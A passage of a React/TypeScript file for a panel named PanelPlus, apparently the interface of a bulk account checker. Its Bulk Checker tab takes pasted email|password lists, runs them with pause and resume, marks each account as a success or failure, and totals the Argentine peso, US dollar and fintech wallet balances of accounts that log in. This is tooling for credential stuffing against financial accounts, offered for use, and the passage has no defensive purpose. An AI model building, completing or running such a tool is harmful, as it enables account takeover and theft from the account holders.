const DataItem = ({ label, value, color }: { label: string; value: string; color?: string }) => (
  <div className="flex items-center justify-between py-1 border-b border-border/50 last:border-0">
    <span className="text-muted-foreground text-[10px]">{label}</span>
    <span className={`text-[10px] font-mono ${color || "text-foreground"}`}>{value}</span>
  </div>
);

// ── Bulk Tab ──
const BulkTab = ({ bulkInput, setBulkInput, loading, results, progress, paused, onCheck, onTogglePause, parseBulkInput }: {
  bulkInput: string; setBulkInput: (v: string) => void; loading: boolean;
  results: AccountResult[]; progress: { done: number; total: number };
  paused: boolean; onCheck: () => void; onTogglePause: () => void;
  parseBulkInput: (t: string) => { email: string; password: string }[];
}) => {
  const successCount = results.filter((r) => r.success).length;
  const totalARS = results.filter(r => r.success).reduce((s, r) => s + (r.balances?.ars || 0) + (r.fintech?.balance || 0), 0);
  const totalUSD = results.filter(r => r.success).reduce((s, r) => s + (r.balances?.usd || 0), 0);

  return (
    <div className="space-y-4">
      <div className="rounded-xl border border-border bg-card overflow-hidden">
        <div className="px-4 py-3 border-b border-border flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Zap className="w-4 h-4 text-primary" />
            <span className="text-sm font-semibold text-foreground">Bulk Checker</span>
            <span className="text-muted-foreground text-xs">{parseBulkInput(bulkInput).length} contas</span>
          </div>
        </div>
        <div className="p-4">
          <textarea value={bulkInput} onChange={(e) => setBulkInput(e.target.value)}
            placeholder="email@exemplo.com|senha123" rows={5}
            className="w-full bg-secondary border border-border rounded-lg p-3 text-foreground text-[13px] font-mono placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary/30 resize-y transition-all" />
        </div>
        <div className="px-4 pb-4 flex items-center justify-between">
          <span className="text-muted-foreground text-[11px]">Formato: <code className="text-primary/60 bg-primary/5 px-1 py-0.5 rounded">email|senha</code></span>
          <div className="flex gap-2">
            {loading && (
              <Button onClick={onTogglePause} size="sm" variant="ghost"
                className={`h-8 text-xs ${paused ? "text-green-400" : "text-amber-400"}`}>
                {paused ? <Play className="w-3.5 h-3.5 mr-1" /> : <Pause className="w-3.5 h-3.5 mr-1" />}
                {paused ? "Retomar" : "Pausar"}
              </Button>
            )}
            <Button onClick={onCheck} disabled={loading || !parseBulkInput(bulkInput).length} size="sm"
              className="h-8 bg-primary text-primary-foreground font-semibold text-xs px-5">
              {loading ? (
                <><Loader2 className="animate-spin mr-1.5 w-3.5 h-3.5" />{progress.total > 0 ? `${progress.done}/${progress.total}` : "..."}</>
              ) : (
                <><Zap className="w-3.5 h-3.5 mr-1" />Iniciar</>
              )}
            </Button>
          </div>
        </div>
        {loading && progress.total > 0 && (
          <div className="px-4 pb-3">
            <div className="w-full bg-secondary rounded-full h-1 overflow-hidden">
              <div className="h-full bg-primary transition-all duration-700" style={{ width: `${(progress.done / progress.total) * 100}%` }} />
            </div>
          </div>
        )}
      </div>

      {results.length > 0 && (
        <>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
            <MetricCard label="Sucesso" value={`${successCount}/${results.length}`} color="text-emerald-400" icon="✓" />
            <MetricCard label="Falha" value={String(results.length - successCount)} color="text-red-400" icon="✕" />
            <MetricCard label="Total ARS" value={fmtARS(totalARS)} color="text-emerald-400" icon="💰" />
            <MetricCard label="Total USD" value={fmtUSD(totalUSD)} color="text-blue-400" icon="🇺🇸" />
          </div>
          <div className="space-y-1">
            {results.map((r, i) => (
              <div key={r.email + i} className={`rounded-lg border px-3 py-2 text-xs flex items-center gap-3 ${
                r.success ? "border-border bg-card" : "border-red-500/20 bg-red-500/5"
              }`}>
                <span className="text-muted-foreground font-mono w-6">{i + 1}</span>
                <span className={`text-[10px] font-semibold px-1.5 py-0.5 rounded ${r.success ? "bg-emerald-500/10 text-emerald-400" : "bg-red-500/10 text-red-400"}`}>
                  {r.success ? "✓" : "✕"}
                </span>
                <span className="font-mono text-foreground flex-1 truncate">{r.email}</span>
                {r.success ? (
                  <>
                    <span className="text-emerald-400 font-mono">{fmtARS(r.balances?.ars)}</span>
                    <span className="text-blue-400 font-mono">{fmtUSD(r.balances?.usd)}</span>
                  </>
                ) : (
                  <span className="text-red-400">{r.error}</span>
                )}
              </div>
            ))}
          </div>
        </>
      )}
    </div>
  );
};

export default PanelPlus;
